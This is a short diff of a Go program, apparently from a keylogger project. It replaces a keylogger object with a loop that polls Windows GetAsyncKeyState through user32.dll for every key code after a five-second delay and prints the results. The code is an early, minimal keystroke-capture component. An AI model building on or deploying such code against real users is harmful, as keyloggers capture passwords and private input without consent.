@@ -2,17 +2,28 @@ package main
 
 import (
 	"fmt"
+	"syscall"
+	"time"
+	//"github.com/AllenDang/w32"
+)
+
+var (
+	user32             = syscall.NewLazyDLL("user32.dll")
+	processessGetState = user32.NewProc("GetAsyncKeyState")
 )
 
 func main() {
 
-	k := createKeylogger()
+	fmt.Println("Starting, get ready in 5 seconds")
+	// wait for a bit
+	time.Sleep(5000 * time.Millisecond)
 
-	fmt.Println(k)
+	for key := 0; key <= 256; key++ {
 
-	k.setSaveToFile("file path here")
-
-	fmt.Println(k)
+		// get value, don't care about the other two values here
+		value, _, _ := processessGetState.Call(uintptr(key))
+		fmt.Print(value)
+	}
 
 }
 
